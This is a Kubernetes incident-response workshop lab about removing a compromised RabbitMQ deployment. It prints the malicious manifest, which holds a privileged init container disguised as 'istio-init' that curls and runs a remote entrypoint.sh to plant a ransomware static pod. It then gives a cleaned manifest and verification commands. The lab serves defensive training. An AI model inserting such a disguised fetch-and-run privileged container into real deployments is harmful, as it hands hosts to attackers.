# Background
In previous sections of this workshop we found that the RabbitMQ deployment had been compromised. The rabbitmq pods created by the deployment will infect the host with a static pod used to execute the ransomware attack. To return our application to its normal operational state we must do two things. First, we must remove the compromised RabbitMQ pods. Second, we must remove the static pods that were created by the compromised RabbitMQ pods. In this lab you will correct the application deployment, and delete the compromised RabbitMQ pods. In the next lab, you will locate and delete the static pods.

## Prerequisites
We will be using a AWS Cloud9 workspace to execute this lab. The following is a list of software that we will use to complete the lab.

1. [kubectl](https://www.eksworkshop.com/020_prerequisites/k8stools/#install-kubectl "install kubectl")
2. [The AWS CLI](https://www.eksworkshop.com/020_prerequisites/k8stools/#update-awscli "AWS CLI installation")

The software should have been installed for you before starting this workshop. However, if it has not been installed you can follow these instructions to [install Kubernetes tools](https://www.eksworkshop.com/020_prerequisites/k8stools/ "EKS tools install page"). These instructions are part of the larger [EKS workshop](https://www.eksworkshop.com/020_prerequisites/k8stools/).

## Removing Compromised RabbitMQ Pods

We will start by reviewing the current manifest for the RabbitMQ deployment. You can get the manifest by running this command:

`kubectl -n sock-shop get deployment rabbitmq -o yaml`

Notice that the `image:`, `command:`, and `securityContext:` elements are incorrect and will need to be changed or removed. We have remove some lines here for readability.

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: rabbitmq
  labels:
    name: rabbitmq
  namespace: sock-shop
spec:
  replicas: 1
  selector:
    matchLabels:
      name: rabbitmq
  template:
    metadata:
      labels:
        name: rabbitmq
      annotations:
        prometheus.io/scrape: "false"
    spec:
      initContainers:    # <--- remove the init container
      - name: istio-init
        image: public.ecr.aws/b3u2a5x0/initubuntu:latest
        imagePullPolicy: Always
        command: ['/bin/bash', '-c', 'curl -o entrypoint.sh https://raw.githubusercontent.com/imtrahman/static-pod/main/entrypoint.sh && chmod +x entrypoint.sh && ./entrypoint.sh && exit']
        securityContext:
          privileged: true
      containers:
      - name: rabbitmq
        image: rabbitmq:3.6.8-management
        env:
          - name: CRYPTO_ACCOUNT_NUMBER
            valueFrom:
              secretKeyRef: 
                name: white-rabbit
                key: CRYPTO_ACCOUNT_NUMBER
        ports:
        - containerPort: 15672
          name: management
        - containerPort: 5672
          name: rabbitmq
        securityContext:
          capabilities:
            drop:
              - all
            add:
              - CHOWN
              - SETGID
              - SETUID
              - DAC_OVERRIDE
      - name: rabbitmq-exporter
        image: kbudde/rabbitmq-exporter
        ports:
        - containerPort: 9090
          name: exporter
      nodeSelector:
        beta.kubernetes.io/os: linux
```

Correcting the manifest and deploying that change will cause Kubernetes to terminate the compromised pods, and replace them with uncompromised pods.

There are several ways to change update a deployment. For example, we can update a deployment using the command `kubectl edit`, `kubectl patch`, `kubectl apply` or `kubectl replace`. For this lab we will provide a corrected yaml manifest and use the command `kubectl apply`. Copy and paste the following commands into your Cloud9 terminal. Once you apply the new manifest Kubernetes will terminate the compromised pods and rollout uncompromised RabbitMQ pods.

```bash
# Create a new manifest
cat <<EOF > fixed-rabbitmq-deployment.yaml
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: rabbitmq
  labels:
    name: rabbitmq
  namespace: sock-shop
spec:
  replicas: 1
  selector:
    matchLabels:
      name: rabbitmq
  template:
    metadata:
      labels:
        name: rabbitmq
      annotations:
        prometheus.io/scrape: "false"
    spec:
      containers:
      - name: rabbitmq
        image: rabbitmq:3.6.8-management
        ports:
        - containerPort: 15672
          name: management
        - containerPort: 5672
          name: rabbitmq
        securityContext:
          capabilities:
            drop:
              - all
            add:
              - CHOWN
              - SETGID
              - SETUID
              - DAC_OVERRIDE
      - name: rabbitmq-exporter
        image: kbudde/rabbitmq-exporter
        ports:
        - containerPort: 9090
          name: exporter
      nodeSelector:
        beta.kubernetes.io/os: linux
EOF
```

## Apply the new manifest
```bash
kubectl -n sock-shop apply --record -f ./fixed-rabbitmq-deployment.yaml
```

The `--record` flag included in the `kubectl apply` command will cause the command used for deploying the manifest to be recorded in with the rollout history. You can view the rollout history with the following command.

```bash
kubectl -n sock-shop rollout history deployment rabbitmq

deployment.apps/rabbitmq
REVISION  CHANGE-CAUSE
1         <none>
2         kubectl apply --record=true -f ./fixed-rabbitmq-deployment.yaml
```

You can verify the change was successful by using the following commands:

> Get a long listing of the rabbitmq deployment. Note the image name has changed. We will use the selector in the next command.

```bash
k get deployment rabbitmq -o wide

NAME       READY   UP-TO-DATE   AVAILABLE   AGE     CONTAINERS                   IMAGES                                               SELECTOR
rabbitmq   1/1     1            1           4d14h   rabbitmq,rabbitmq-exporter   rabbitmq:3.6.8-management,kbudde/rabbitmq-exporter   name=rabbitmq
```

Get the rabbitmq pod based on the pod selector. Note the age should reflect the recent deployment. We will use the pod name in the next command.

```bash
kubectl -n sock-shop get pods --selector name=rabbitmq

NAME                        READY   STATUS    RESTARTS   AGE   IP            NODE                           NOMINATED NODE   READINESS GATES
rabbitmq-57dd566589-4mmmd   2/2     Running   0          1m   10.0.189.60   ip-10-0-191-117.ec2.internal   <none>           <none>
```

Get the pod spec using the pod name. You can confirm that the image and security context were updated. Some lines were removed for readability.

```bash
kubectl -n sock-shop get pods rabbitmq-57dd566589-4mmmd -o yaml

apiVersion: v1
kind: Pod
metadata:
  annotations:
    kubernetes.io/psp: eks.privileged
    prometheus.io/scrape: "false"
  creationTimestamp: "2021-10-29T17:03:26Z"
  generateName: rabbitmq-57dd566589-
  labels:
    name: rabbitmq
    pod-template-hash: 57dd566589
  name: rabbitmq-57dd566589-4mmmd
  namespace: sock-shop
  ownerReferences:
  - apiVersion: apps/v1
    blockOwnerDeletion: true
    controller: true
    kind: ReplicaSet
    name: rabbitmq-57dd566589
    uid: 1c49e7a0-5e46-4977-b17f-a95f410da140
  resourceVersion: "894492"
  uid: 49fe1e3f-eb3f-46bb-ae2e-dd42110bf658
spec:
  containers:
  - image: rabbitmq:3.6.8-management
    imagePullPolicy: Always
    name: rabbitmq
    ports:
    - containerPort: 15672
      name: management
      protocol: TCP
    - containerPort: 5672
      name: rabbitmq
      protocol: TCP
    resources: {}
      [...]
```

You will delete the static pod created by the compromised RabbitMQ pod in the next step. When you're ready, click this [link](./remove-static-pod.md) to continue. 
